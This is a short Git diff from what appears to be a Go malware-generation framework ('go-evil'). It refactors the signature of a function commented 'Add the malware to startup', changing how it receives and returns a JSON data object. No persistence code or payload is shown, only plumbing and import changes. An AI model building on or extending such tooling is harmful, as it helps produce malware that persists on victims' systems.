@@ -3,13 +3,12 @@ package startup
 import (
 	"fmt"
 
-	"github.com/TeamPhoneix/go-evil/utility/structure"
 	"github.com/TeamPhoneix/go-evil/utility/structure/functions"
+	"github.com/TeamPhoneix/go-evil/utility/structure/json"
 )
 
 // Add the malware to startup
-func Add(s_json string) ([]string, string) {
-	data_object := structure.Receive(s_json)
+func Add(data_object *json.Json_t) []string {
 	function_call := "Add_startup"
 
 	body := []string{}
@@ -68,5 +67,5 @@ func Add(s_json string) ([]string, string) {
 	data_object.Add_go_import("bufio")
 	data_object.Add_go_import("os")
 
-	return []string{fmt.Sprintf("%s()", function_call)}, structure.Send(data_object)
+	return []string{fmt.Sprintf("%s()", function_call)}
 }
